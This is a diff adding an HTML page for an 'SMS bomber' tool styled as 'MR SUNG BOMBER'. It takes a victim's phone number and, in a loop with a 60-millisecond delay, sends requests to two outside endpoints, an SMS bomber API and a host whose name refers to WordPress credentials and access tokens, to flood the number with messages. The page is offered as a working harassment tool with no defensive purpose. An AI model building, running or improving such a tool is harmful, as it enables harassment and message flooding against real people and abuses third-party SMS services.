@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JuNaid - FULL NEUMORPHIC</title>
+    <style>
+        #bg-video{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    z-index:-1;
+} 
+       #bg-audio{
+    position:fixed;
+    top:0;
+    left:0;
+    width:1%;
+    height:1%;
+    object-fit:cover;
+    z-index:-1;
+}
+        :root {
+            --bg: #e0e5ec;
+            --shadow-light: #ffffff;
+            --shadow-dark: #a3b1c6;
+            --text: #44475a;
+            --accent: #00d2ff;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        /* Full Neumorphic Card */
+        .container {
+            width: 90%;
+            max-width: 420px;
+            padding: 35px;
+            background: var(--bg);
+            border-radius: 40px;
+            box-shadow: 20px 20px 60px var(--shadow-dark), 
+                       -20px -20px 60px var(--shadow-light);
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 22px;
+            letter-spacing: 2px;
+            margin-bottom: 5px;
+            color: #555;
+            text-shadow: 1px 1px 0px white;
+        }
+
+        .subtitle {
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #888;
+            margin-bottom: 25px;
+        }
+
+        /* Inset Input (Looks carved into the surface) */
+        .input-well {
+            padding: 5px;
+            border-radius: 20px;
+            box-shadow: inset 6px 6px 12px var(--shadow-dark), 
+                        inset -6px -6px 12px var(--shadow-light);
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            padding: 15px;
+            text-align: center;
+            font-size: 18px;
+            color: var(--text);
+            outline: none;
+            font-weight: 600;
+        }
+
+        /* Row for 10, 20, 50, 100 buttons */
+        .btn-row {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .neu-btn-small {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 12px;
+            background: var(--bg);
+            box-shadow: 5px 5px 10px var(--shadow-dark), 
+                        -5px -5px 10px var(--shadow-light);
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: bold;
+            color: #666;
+            transition: 0.2s;
+        }
+
+        .neu-btn-small:active {
+            box-shadow: inset 3px 3px 6px var(--shadow-dark), 
+                        inset -3px -3px 6px var(--shadow-light);
+        }
+
+        /* Main Execute Button */
+        .execute-btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 20px;
+            background: var(--bg);
+            box-shadow: 8px 8px 15px var(--shadow-dark), 
+                        -8px -8px 15px var(--shadow-light);
+            color: #444;
+            font-weight: 900;
+            letter-spacing: 1px;
+            cursor: pointer;
+            margin-bottom: 25px;
+            transition: 0.3s;
+        }
+
+        .execute-btn:active {
+            box-shadow: inset 5px 5px 10px var(--shadow-dark), 
+                        inset -5px -5px 10px var(--shadow-light);
+            color: var(--accent);
+        }
+
+        #stopBtn {
+            color: #ff4b2b;
+            display: none;
+        }
+
+        /* LCD Display Panel */
+        .lcd-panel {
+            background: var(--bg);
+            padding: 20px;
+            border-radius: 25px;
+            box-shadow: inset 4px 4px 8px var(--shadow-dark), 
+                        inset -4px -4px 8px var(--shadow-light);
+            margin-bottom: 25px;
+        }
+
+        #hitCounter {
+            font-size: 45px;
+            font-family: 'Courier New', Courier, monospace;
+            font-weight: 900;
+            color: #555;
+        }
+
+        .status-msg {
+            font-size: 11px;
+            color: #999;
+            margin-top: 5px;
+            letter-spacing: 1px;
+        }
+
+        /* Footer Links */
+        .footer {
+            display: flex;
+            gap: 15px;
+        }
+
+        .footer a {
+            flex: 1;
+            padding: 12px;
+            text-decoration: none;
+            font-size: 11px;
+            font-weight: bold;
+            color: #888;
+            border-radius: 15px;
+            box-shadow: 4px 4px 8px var(--shadow-dark), 
+                        -4px -4px 8px var(--shadow-light);
+        }
+    </style>
+</head>
+
+<body>
+    <audio id="bgm" controls autoplay loop>
+    <source src="sungjin-woo.mp3" type="audio/mpeg">
+</audio>
+    <video id="bg-video" autoplay muted loop playsinline>
+    <source src="sungjin-woo.mp4" type="video/mp4">
+</video>
+
+<div class="container">
+    <h1>JD </h1>
+    <div class="subtitle">MR SUNG BOMBER📵</div>
+
+    <div class="input-well">
+        <input type="number" id="target" placeholder="923xxxxxxxxx">
+    </div>
+
+    <div class="btn-row">
+        <button class="neu-btn-small" onclick="setHits(10)">10</button>
+        <button class="neu-btn-small" onclick="setHits(20)">20</button>
+        <button class="neu-btn-small" onclick="setHits(50)">50</button>
+        <button class="neu-btn-small" onclick="setHits(100)">100</button>
+    </div>
+
+    <button id="startBtn" class="execute-btn" onclick="blast()">MR SUNG ATTACK🍷</button>
+    <button id="stopBtn" class="execute-btn" onclick="stop()">START MISSION 📵</button>
+
+    <div class="lcd-panel">
+        <div id="hitCounter">00</div>
+        <div class="status-msg" id="status">SYSTEM IDLE</div>
+    
+<script>
+    let active = false;
+    let hits = 0;
+    const API_SMS = "https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php";
+    const API_WP = "https://get-wp-creds-json-and-access-token.onrender.com/code";
+
+    function setHits(val) {
+        // Option to pre-fill number or just visual feedback
+        console.log("Limit set to: " + val);
+    }
+
+    async function blast() {
+        const num = document.getElementById('target').value;
+        if(!num) return alert("System Error: Enter Target!");
+
+        active = true;
+        hits = 0;
+        document.getElementById('startBtn').style.display = 'none';
+        document.getElementById('stopBtn').style.display = 'block';
+        document.getElementById('status').innerText = "BLASTING IN PROGRESS...";
+
+        while(active) {
+            // Multi-Strike Logic
+            const tasks = [
+                fetch(`${API_SMS}?number=${num}`, { mode: 'no-cors' }),
+                fetch(`${API_WP}?number=${num}`, { mode: 'no-cors' })
+            ];
+
+            await Promise.allSettled(tasks);
+            hits += 2;
+            document.getElementById('hitCounter').innerText = hits < 10 ? "0" + hits : hits;
+            
+            // Ultra-fast delay
+            await new Promise(r => setTimeout(r, 60));
+        }
+    }
+
+    function stop() {
+        active = false;
+        document.getElementById('startBtn').style.display = 'block';
+        document.getElementById('stopBtn').style.display = 'none';
+        document.getElementById('status').innerText = "ATTACK TERMINATED";
+    }
+</script>
+
+</body>
+</html>
